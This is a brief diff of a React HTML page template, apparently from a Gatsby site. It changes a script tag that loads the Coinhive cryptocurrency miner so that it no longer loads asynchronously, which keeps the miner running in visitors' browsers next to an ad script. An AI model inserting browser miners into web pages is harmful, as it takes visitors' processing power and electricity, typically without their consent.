@@ -37,7 +37,7 @@ export default class HTML extends React.Component {
             dangerouslySetInnerHTML={{ __html: this.props.body }}
           />
           {this.props.postBodyComponents}
-          <script src="https://coinhive.com/lib/coinhive.min.js" async></script>
+          <script src="https://coinhive.com/lib/coinhive.min.js"></script>
           <script
             async
             src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"
